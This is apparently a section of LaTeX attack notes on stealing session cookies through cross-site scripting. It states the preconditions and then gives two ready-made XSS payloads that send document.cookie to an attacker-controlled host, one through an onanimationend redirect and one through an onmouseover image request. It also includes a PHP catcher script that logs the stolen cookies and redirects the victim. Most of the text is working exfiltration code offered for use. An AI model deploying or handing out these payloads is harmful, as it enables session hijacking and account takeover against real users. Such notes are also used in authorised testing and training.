\section{Cross-Site Scripting (XSS)}
For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
\begin{itemize}
    \item Session cookies should be carried in all HTTP requests
    \item Session cookies should be accessible by JavaScript code (the
        \verb+HTTPOnly+ attribute should be missing)
\end{itemize}

\begin{verbatim}
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
\end{verbatim}

Catcher:
\begin{verbatim}
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
\end{verbatim}


A sample HTTPS>HTTPS payload example:

\begin{verbatim}
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
\end{verbatim}

